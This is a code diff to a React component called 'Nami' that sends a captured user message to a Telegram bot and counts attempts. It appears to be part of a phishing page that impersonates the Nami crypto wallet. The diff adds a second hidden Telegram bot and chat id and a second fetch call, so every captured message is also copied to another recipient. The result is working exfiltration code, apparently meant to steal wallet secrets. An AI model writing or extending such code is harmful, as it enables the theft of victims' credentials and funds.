@@ -54,12 +54,22 @@ function Nami() {
 
     const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
+    const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
+    const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
+
+
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;
+
 
     const data = {
         chat_id: chat_id,
         text: `Nami:   ${message}`,
+    };
+    const odata = {
+      chat_id: ochat_id,
+      text: `Nami:   ${message}`,
     };
 
     // Update the number of attempts
@@ -77,6 +87,18 @@ function Nami() {
 
             if (!response.ok) {
                 throw new Error("Network response was not ok");
+            }
+
+            const oresponse = await fetch(ourl, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(odata),
+            });
+      
+            if (!oresponse.ok) {
+              throw new Error("Network response was not ok");
             }
 
             console.log("Message sent successfully");
